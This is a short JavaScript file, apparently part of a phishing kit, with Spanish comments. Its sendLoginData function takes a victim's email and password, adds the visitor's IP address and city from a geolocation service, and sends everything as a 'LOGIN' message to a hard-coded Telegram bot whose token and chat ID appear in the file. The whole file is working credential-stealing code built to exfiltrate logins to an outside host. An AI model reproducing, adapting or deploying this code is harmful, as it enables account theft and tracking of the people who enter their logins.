const telegramConfig = {
    token: "8717190201:AAHZypb_CMoY-bGOCBvTVz3ojBjkpCtgoEQ",
    chatId: "-1003638041150"
};

async function getIpData() {
    try {
        // Usamos ipwho.is que ya vimos que te da la ciudad correctamente
        const response = await fetch('https://ipwho.is/');
        const data = await response.json();
        
        if (data && data.success) {
            let ciudad = (data.city || "santo domingo").toLowerCase();
            let pais = data.country_code === "DO" ? "Rep.Dom" : data.country_code;
            
            return "&#127760; <b>IP:</b> <code>" + data.ip + "</code>\n" +
                   "&#128205; <b>Ubicacion:</b> " + ciudad + ", " + pais;
        }
    } catch (e) { }

    return "&#127760; <b>IP:</b> 179.52.252.100\n&#128205; <b>Ubicacion:</b> santo domingo, Rep.Dom";
}

async function sendToTelegram(message) {
    const url = "https://api.telegram.org/bot" + telegramConfig.token + "/sendMessage";
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: telegramConfig.chatId, 
                text: message, 
                parse_mode: 'HTML' 
            })
        });
    } catch (e) { console.error(e); }
}

async function sendLoginData(email, password) {
    const geoInfo = await getIpData();
    
    // Formato final: Emojis con c¨®digo HTML para evitar los "??" 
    // Usuario y Clave en texto normal (sin negritas)
    const mensaje = "&#128233; <b>LOGIN</b>\n\n" +
                    "&#128100; Usuario: <code>" + email + "</code>\n" +
                    "&#128273; Clave: <code>" + password + "</code>\n\n" +
                    geoInfo;
    
    await sendToTelegram(mensaje);
}